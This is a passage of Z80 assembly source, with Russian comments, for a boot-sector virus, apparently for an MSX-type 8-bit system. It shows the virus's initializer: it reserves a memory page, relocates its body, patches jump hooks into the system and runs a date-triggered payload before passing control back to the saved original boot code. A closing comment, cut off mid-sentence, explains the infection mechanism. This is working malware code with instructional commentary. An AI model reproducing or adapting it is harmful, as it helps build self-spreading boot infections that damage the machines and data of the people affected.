VBeg:
	push	af
	push	de
	push	hl

	ld	de,Rettable-VBeg
	add	hl,de
	ld	de,BootPage+StEntry
	ld	bc,6
	ldir

	ld	hl,(HIMEM)
	ld	l,c		; Разместились с границы страницы
	dec	h
	ld	(HIMEM),hl	; Получили 1 страницу

	ex	de,hl		; Переслать тело ловушки на место
	pop	hl
	push	de
	inc	b
	ldir

	pop	hl		; Установить ловушки
	ld	l,low HookBody
	ld	(Hook+1),hl
	push	hl
	ld	a,0C3h
	ld	(Hook),a

	ld	(Hook2),a
	ld	l,low Hook2Body
	ld	de,Hook2Place+1
	ld	(Hook2+1),de
	ld	c,Hook2Len
	ldir

	call	DateIn		; Проверить дату
	ld	hl,month * 256 + day
	xor	a
	sbc	hl,de
	pop	hl
	ld	l,low PutMess
	jr	z,jhl

	pop	de
	pop	af
	pop	hl
	jp	BootPage+StEntry

; Для вызова нашей подпрограммы в момент загрузки системы необходимо,
; чтобы в байтах StEntry .. StEntry+5 0-го сектора был записан код для
; вызова инициализатора вируса. Именно он и называется "Образец".
; Но после завершения инициализации необходимо выполнить и те действия,
; код для которых в незараженном 0-м секторе находится по данным адресам.
; Самый простой способ это сделать - это хранить старые 6 байтов и,
; получив управление, переписать их на их законное место, и передать
; затем управление по адресу BootRage+StEntry. Именно этот старый код
